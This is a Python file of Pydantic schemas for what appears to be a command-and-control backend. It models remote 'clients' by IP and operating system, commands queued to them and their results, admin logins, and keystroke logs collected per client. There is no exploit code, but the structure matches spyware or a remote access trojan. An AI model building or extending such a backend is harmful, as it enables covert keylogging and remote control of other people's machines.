from pydantic import BaseModel
from typing import Optional
from datetime import datetime


class ClientBase(BaseModel):
    client_id: str
    ip_address: str
    operating_system: str

class ClientCreate(ClientBase):
    pass

class Client(ClientBase):
    id: int
    last_seen: datetime
    is_active: bool

    class Config:
        orm_mode = True

class CommandBase(BaseModel):
    command: str

class CommandCreate(CommandBase):
    client_id: int

class Command(CommandBase):
    id: int
    client_id: int
    executed: bool
    execution_time: Optional[datetime]
    result: Optional[str]

    class Config:
        orm_mode = True
        

class AdminBase(BaseModel):
    username: str


class AdminCreate(AdminBase):
    password: str


class Admin(AdminBase):
    id: int

    class Config:
        orm_mode = True


class KeystrokeLogBase(BaseModel):
    text: str

class KeystrokeLogCreate(BaseModel):
    client_id: int
    text: str

class KeystrokeLog(KeystrokeLogBase):
    id: int
    client_id: int
    timestamp: datetime
    text: str

    class Config:
        orm_mode = True

class KeystrokeLogUpdate(BaseModel):
    text: Optional[str] = None
